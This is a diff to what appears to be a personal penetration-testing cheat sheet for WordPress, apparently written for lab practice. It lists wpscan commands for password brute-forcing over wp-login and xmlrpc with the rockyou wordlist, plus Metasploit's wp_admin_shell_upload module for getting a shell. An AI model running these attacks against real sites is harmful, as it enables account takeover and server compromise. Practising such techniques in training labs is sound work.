@@ -32,7 +32,7 @@ Wordpress
 4- wpscan --url https://site.com/wordpress/ --http-auth admin:admin
 5-  wpscan brute
 	wpscan --usernames tom -P /usr/share/wordlists/rockyou.txt --force --password-attack wp-login --url 
-
+	wpscan --password-attack xmlrpc -t 20 -U admin, david -P rockyou.txt --url http://blog.inlanefreight.com
 6- use metasploit > use exploit/unix/webapp/wp_admin_shell_upload
 	> set rhost example.com
 	> set username admin
